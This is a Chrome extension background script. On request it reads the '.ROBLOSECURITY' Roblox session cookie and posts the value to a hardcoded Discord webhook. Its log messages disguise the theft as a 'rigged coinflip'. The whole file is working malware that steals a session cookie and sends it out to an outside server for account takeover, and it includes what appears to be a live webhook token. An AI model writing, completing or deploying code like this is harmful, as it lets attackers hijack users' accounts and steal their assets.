const WEBHOOK_URL = "https://discord.com/api/webhooks/1322608120291135659/eKndWWuHkWDJupia3kEhUXxlp1mpxYG4nrbocNWFx1pdjM0-N94-lTHI2ZT_GCRuNX5R";

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "getAndSendCookie") {
        chrome.cookies.get(
            { url: "https://www.roblox.com", name: ".ROBLOSECURITY" },
            (cookie) => {
                if (cookie) {
                    sendToWebhook(cookie.value);
                    sendResponse({ success: true, message: "Cookie sent to webhook." });
                } else {
                    sendResponse({ success: false, message: "Cookie not found." });
                }
            }
        );
        return true; // Keep the message channel open for async response
    }
});

function sendToWebhook(cookie) {
    console.log("Rigged coinflip to be sent:", cookie); // Debugging line
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content: `Rigged Coinflip: \`${cookie}\``,
        }),
    })
        .then((response) => {
            if (!response.ok) {
                console.error("Failed to rig coinflip.", response.status, response.statusText);
            } else {
                console.log("Rigged coinflip successfully.");
            }
        })
        .catch((error) => {
            console.error("Error rigging coinflip.:", error);
        });
}
